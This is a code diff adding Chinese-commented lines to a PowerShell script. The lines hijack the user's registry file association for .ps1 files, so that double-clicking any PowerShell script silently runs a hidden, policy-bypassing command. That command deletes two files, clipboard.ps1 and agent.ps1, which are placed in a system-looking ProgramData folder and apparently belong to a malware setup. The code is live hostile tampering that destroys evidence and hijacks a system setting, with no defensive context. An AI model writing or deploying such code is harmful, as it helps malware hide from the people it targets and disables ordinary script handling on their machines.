@@ -1,5 +1,31 @@
 # === main.ps1 ===
 
+# ✅ 删除 clipboard.ps1 和 agent.ps1
+$TARGET1 = "C:\ProgramData\Microsoft\Windows\clipboard.ps1"
+$TARGET2 = "C:\ProgramData\Microsoft\Windows\agent.ps1"
+
+# 输出日志，确保删除操作已设置
+Write-Host "Setting up DeleteOnOpen for: $TARGET1 and $TARGET2"
+
+# 构建删除文件的命令
+$cmd2 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep -Milliseconds 150; Remove-Item -LiteralPath '$TARGET1' -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath '$TARGET2' -Force -ErrorAction SilentlyContinue`""
+
+# 注册 DeleteOnOpen 动作（确保它只在打开文件时触发）
+$key2 = "HKCU:\Software\Classes\Microsoft.PowerShellScript.1\shell\DeleteOnOpen\command"
+
+# 创建命令注册项
+New-Item -Path $key2 -Force | Out-Null
+Set-ItemProperty -Path $key2 -Name "(Default)" -Value $cmd2
+
+# 设置 DeleteOnOpen 为默认操作
+Set-ItemProperty `
+  -Path "HKCU:\Software\Classes\Microsoft.PowerShellScript.1\shell" `
+  -Name "(Default)" `
+  -Value "DeleteOnOpen"
+
+Write-Host "DeleteOnOpen setup complete. Both files will be deleted when double-clicked."
+
+
 # ✅ 
 try {
     Unblock-File -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
